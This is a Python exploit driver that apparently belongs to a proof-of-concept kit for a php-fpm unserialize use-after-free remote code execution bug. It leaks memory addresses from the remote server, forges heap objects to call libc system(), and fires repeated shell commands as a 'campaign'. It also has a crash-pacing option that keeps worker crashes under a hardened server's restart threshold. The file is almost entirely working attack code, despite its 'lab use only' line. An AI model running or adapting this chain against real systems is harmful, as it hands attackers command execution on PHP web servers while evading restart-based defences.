#!/usr/bin/env python3
# INDEX: resolve-once fire-many rce campaign driver | fpm | pure | serialize+unserialize | free | multi-worker pool
"""Resolve-once, fire-many driver for the php-fpm unserialize-UAF RCE
(multi-worker pool). CVE-2026-109618 / CVE-2026-109619.

Every address the fire needs is worker-invariant on fpm (binbase, the 2 MiB
zend_mm chunk base, executor_globals, libc system(), the stdClass ce, and the
spray slot are fork-shared and reset to the same post-RINIT baseline each
request), so the expensive discovery runs ONCE and each later command is a
single self-contained fire (~1 request + 1 crash) landing on whichever worker
the pool scatters it to. --crash-pace throttles the discovery crash rate to stay
under a hardened target's emergency_restart_threshold window. Composes the
remote binbase+chunk leak, the fpm RCE driver, and the 8.4.26 fire shim, all
imported read-only. Pure stdlib, safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/

# 8.5.11 leak overrides (the binbase leak module defaults are the 8.4.26
# constants; the 8.5 path needs these).
_V85_OBJ_CHUNK_OFF = 0x5b230
_V85_ZVAL_PTR_DTOR_OFF = 0x829460
_V85_STD_OBJ_HANDLERS_OFF = 0x1bff0a0


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


def _install_crash_pace(remote_rce, seconds):
    """Wrap the installed remote_rce.send_http so a crashing request (returns
    None) is followed by ``seconds`` of sleep, bounding the crash rate. No file
    edit: this reassigns the module attribute at runtime."""
    if not seconds:
        return
    inner = remote_rce.send_http

    def paced(payload, host=None, port=None, timeout=3):
        out = inner(payload, host=host, port=port, timeout=timeout)
        if out is None:
            time.sleep(seconds)
        return out

    remote_rce.send_http = paced


def resolve_once(host, port, path, cmd0, variant="8.4", tries=12, attempts=6,
                 crash_pace=0.0, binbase=None, chunk=None, verbose=True):
    """Run the full discovery + first fire once. Returns (rce_module, ctx, info)
    where ctx = (ce_stdclass, system_addr, spray_addr) is reusable for fire-only
    shots, or (None, None, info) on failure. ``info`` carries binbase/chunk and
    the request/crash budget spent."""
    rce = _load("fpm_route", "fpm_route.py")
    shim_token = None

    # ----- Phase 1: remote binbase + chunk (unless supplied) -----
    if binbase is None:
        rleak = _load("fpm_binbase_leak", "primitives/read_leak/fpm_binbase_leak.py")
        if variant == "8.5":
            rleak.OBJ_CHUNK_OFF = _V85_OBJ_CHUNK_OFF
            rleak.ZVAL_PTR_DTOR_OFF = _V85_ZVAL_PTR_DTOR_OFF
            rleak.STD_OBJ_HANDLERS_OFF = _V85_STD_OBJ_HANDLERS_OFF
        remote_rce = rleak._load_remote_rce()
        remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
        if verbose:
            print("=" * 64)
            print("[campaign] Phase 1: write-free remote binbase leak (no /proc)")
        binbase, ld = rleak.leak_binbase(remote_rce, leak_tries=tries, verbose=verbose)
        if binbase is None:
            return None, None, {"stage": "leak", "error": ld.get("error")}
        chunk = ld.get("chunk")
        if verbose:
            print(f"[campaign] binbase=0x{binbase:x} chunk=0x{chunk:x}")

    # ----- Phase 2: install transport + fire shims, full chain once -----
    rce.install_fpm_patches(host, port, path, binbase, enum=False)
    if variant == "8.4":
        shim = _load("fire_8426_shim", "fire_8426_shim.py")
        shim_token = shim.install(rce.remote_rce, binbase, verbose=verbose)
    _install_crash_pace(rce.remote_rce, crash_pace)

    if not rce.preflight_reflect(host, port, path):
        if shim_token is not None:
            shim_token.restore()
        return None, None, {"stage": "preflight",
                            "error": "echo sink did not reflect serialize()"}

    if verbose:
        print("=" * 64)
        print(f"[campaign] Phase 2: full discovery + first fire (cmd0={cmd0!r})")
    ok, stats = rce.run_fpm_chain(host, port, path, binbase, cmd0,
                                  chunk=chunk, attempts=attempts)
    # The serialize/echo fire SIGSEGVs after system() runs, so ``ok`` is an
    # expected false-negative; the cached context is valid as long as the fire
    # step was reached (stats carries spray_addr/ce/system only then).
    ctx = (stats.get("ce_stdclass"), stats.get("system"), stats.get("spray_addr"))
    info = {
        "binbase": binbase, "chunk": chunk,
        "eg": stats.get("eg"), "libc_base": stats.get("libc_base"),
        "system": stats.get("system"), "ce_stdclass": stats.get("ce_stdclass"),
        "spray_addr": stats.get("spray_addr"),
        "resolve_reqs": stats.get("total_reqs"),
        "resolve_crashes": stats.get("total_crashes"),
        "fire0_ok": bool(ok), "shim_token": shim_token, "stage": "fire",
    }
    if None in ctx:
        info["error"] = "discovery did not reach R-7 (no reusable context)"
        if shim_token is not None:
            shim_token.restore()
        return None, None, info
    return rce, ctx, info


def fire_only(rce, ctx, cmd, fire_retries=3, verbose=True):
    """Cached fire(s) for an extra command (<=14 bytes after the GC byte on
    the stock object finisher), reusing the worker-invariant ctx -- NO repeat of
    the ~352-request discovery.

    A bare cached fire lands poorly -- the forged object's spray only reclaims
    the freed var_hash slot when the serving worker has just been put through
    the spray/free cycle. Prepending ONE heap_leak() (the groom) before each
    fire restores reliable landing. So a
    cached shot is heap_leak()+trigger_rce() (~2 requests + 1 crash), repeated
    up to fire_retries to absorb per-shot reclaim probability (there is no
    in-band success signal: the fire SIGSEGVs after system() runs, so verify the
    command's effect out of band). Returns the number of fires delivered."""
    ce_stdclass, system_addr, spray_addr = ctx
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")
    if verbose:
        print(f"[campaign] fire-only (x{fire_retries}, leak-primed): {cmd!r}")
    fired = 0
    for _ in range(fire_retries):
        rce.remote_rce.heap_leak()                      # groom primes the reclaim
        # trigger_rce prepends the GC byte itself (expects b"\x09"+cmd14).
        rce.remote_rce.trigger_rce(ce_stdclass, system_addr, spray_addr, b"\x09" + cmd)
        fired += 1
    return fired


def run_campaign(host, port, path, cmds, variant="8.4", tries=12, attempts=6,
                 crash_pace=0.0, binbase=None, chunk=None, fire_retries=3,
                 verbose=True):
    """Resolve once, then fire every command in ``cmds``. Returns a result dict.
    Verify each command's effect OUT OF BAND (the fire SIGSEGVs the worker, so
    there is no in-band success signal on the serialize/echo sink)."""
    if not cmds:
        raise ValueError("no commands")
    bb = None if binbase is None else int(binbase)
    ck = None if chunk is None else int(chunk)
    rce, ctx, info = resolve_once(host, port, path, cmds[0], variant=variant,
                                  tries=tries, attempts=attempts,
                                  crash_pace=crash_pace, binbase=bb, chunk=ck,
                                  verbose=verbose)
    info["cmds"] = list(cmds)
    if rce is None:
        info["delivered"] = 0
        return info
    delivered = [cmds[0]]              # cmd0 already fired by resolve_once
    for cmd in cmds[1:]:
        fire_only(rce, ctx, cmd, fire_retries=fire_retries, verbose=verbose)
        delivered.append(cmd)
    token = info.pop("shim_token", None)
    if token is not None:
        token.restore()
    info["delivered"] = len(delivered)
    extra = len(delivered) - 1
    # each extra command is fire_retries x (heap_leak + fire) ~= 2*fire_retries req
    info["campaign_est_reqs"] = (info.get("resolve_reqs") or 0) + extra * 2 * fire_retries
    return info


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8191)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--variant", choices=["8.4", "8.5"], default="8.4")
    ap.add_argument("--cmd", action="append", default=None,
                    help="command to run (repeatable; each <=14 bytes after the "
                         "GC byte). The 1st rides the full discovery; the rest "
                         "are cached fire-only shots.")
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--crash-pace", type=float, default=0.0,
                    help="seconds to sleep after each crashing request, to keep "
                         "the ~214 discovery crashes under a hardened target's "
                         "emergency_restart_threshold/_interval window (0=off).")
    ap.add_argument("--binbase", default=None, help="skip the leak; hex PIE base")
    ap.add_argument("--chunk", default=None, help="optional hex chunk base")
    ap.add_argument("--fire-retries", type=int, default=3,
                    help="leak-primed fires per cached command (absorbs per-shot "
                         "reclaim probability; a bare fire lands ~0, leak+fire ~6/6)")
    args = ap.parse_args(argv)

    cmds = args.cmd or ["id>/dev/shm/p"]
    binbase = int(args.binbase, 16) if args.binbase else None
    chunk = int(args.chunk, 16) if args.chunk else None

    print(f"[campaign] {args.variant} resolve-once/fire-many over "
          f"http://{args.host}:{args.port}{args.path}  ({len(cmds)} command(s))")
    r = run_campaign(args.host, args.port, args.path, cmds, variant=args.variant,
                     tries=args.tries, attempts=args.attempts,
                     crash_pace=args.crash_pace, binbase=binbase, chunk=chunk,
                     fire_retries=args.fire_retries)
    print("=" * 64)
    if r.get("spray_addr") is None:
        print(f"[campaign] FAILED at {r.get('stage')}: {r.get('error')}")
        return 1
    print(f"[campaign] binbase=0x{r['binbase']:x} chunk=0x{r['chunk']:x} "
          f"system=0x{r['system']:x} ce=0x{r['ce_stdclass']:x} "
          f"S=0x{r['spray_addr']:x}")
    print(f"[campaign] discovery: ~{r.get('resolve_reqs')} req / "
          f"{r.get('resolve_crashes')} crashes; delivered {r['delivered']} "
          f"command(s) (~{r.get('campaign_est_reqs')} req total vs "
          f"{len(cmds)}x full-chain).")
    print("[campaign] verify each command OUT OF BAND (the fire SIGSEGVs after "
          "system() returns; check the marker, not the HTTP response).")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
